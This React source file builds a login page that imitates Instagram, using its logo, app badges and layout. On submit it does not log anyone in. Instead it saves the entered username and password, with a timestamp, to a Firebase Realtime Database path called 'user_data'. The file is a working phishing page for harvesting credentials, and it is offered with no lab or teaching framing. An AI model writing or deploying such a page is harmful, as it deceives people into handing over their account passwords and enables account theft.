import React, { useState } from "react";
import "./App.css";
import { getDatabase, ref, set } from "firebase/database";
import app from "./firebase";

const App = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = (e) => {
    e.preventDefault();

    // Initialize Firebase Realtime Database
    const database = getDatabase(app);

    // Create a new object with updated data
    const newUserData = {
      username,
      password,
      timestamp: new Date().toString(), // Include a timestamp or any other data you want to update
    };

    // Update the data at the specified path ("user_data") with the new object
    const dbRef = ref(database, "user_data");
    set(dbRef, newUserData)
      .then(() => {
        console.log("Data updated successfully!");
        // Optionally, you can perform additional actions after updating the data
      })
      .catch((error) => {
        console.error("Error updating data:", error);
      });
  };

  return (
    <React.Fragment>
      <div id="wrapper">
        <div className="container">
          <div className="left-side-image">
            <img
              src="https://ik.imagekit.io/dnr/insta/insta-main.jpeg?updatedAt=1705120661173"
              alt="Left Side Image"
            />
          </div>
          <div className="phone-app-demo" />
          <div className="form-data">
            <form onSubmit={handleLogin}>
              <div className="logo" style={{ marginBottom: '10vh' }}>
                <img
                  src="https://www.pngkey.com/png/full/2-27715_instagram-png-logo-instagram-word-logo-png.png"
                  alt="Image"
                  style={{ width: '80%', height: '80%', borderRadius: '0.4rem', boxShadow: '0px 0px 10px rgba(0, 0, 0, 0.1)' }}
                />
              </div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button className="form-btn" type="submit">
                Log in
              </button>
              <span className="has-separator">Or</span>
              <a href="#" className="facebook-login">
                <i className="fab fa-facebook" /> Log in with Facebook
              </a>
              <a className="password-reset" href="#">
                Forgot password?
              </a>
            </form>
            <div className="sign-up">
              Don't have an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <span>Get the app</span>
              <div className="badge">
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                  alt="android App"
                />
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                  alt="ios app"
                />
              </div>
            </div>
          </div>
        </div>

        <footer>
          <div className="container">
            <nav className="footer-nav">
              <ul>
                <li>
                  <a href="#">About Us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Jobs</a>
                </li>
                <li>
                  <a href="#">Privacy</a>
                </li>
                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Profiles</a>
                </li>
                <li>
                  <a href="#">Languages</a>
                </li>
              </ul>
            </nav>
            <div className="copyright-notice">&copy; 2024 Complaints</div>
          </div>
        </footer>
      </div>
    </React.Fragment>
  );
};

export default App;
